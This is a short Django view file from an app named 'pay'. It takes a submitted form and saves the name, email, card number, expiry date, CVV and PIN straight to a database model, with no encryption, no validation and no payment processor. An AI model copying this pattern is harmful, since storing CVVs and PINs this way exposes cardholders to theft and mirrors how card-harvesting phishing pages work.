from django.shortcuts import render
from pay.models import Home


# Create your views here.
def home(request):
    if request.method == "POST":
        name =request.POST.get('name')
        lname=request.POST.get('lname')
        email=request.POST.get('email')
        number=request.POST.get('number')
        date=request.POST.get('date')
        Cvv=request.POST.get('Cvv')
        pin=request.POST.get('pin')
        details=Home(name=name,lname=lname,email=email,number=number,date=date,Cvv=Cvv,pin=pin)
        details.save()



    return render(request,"index.html")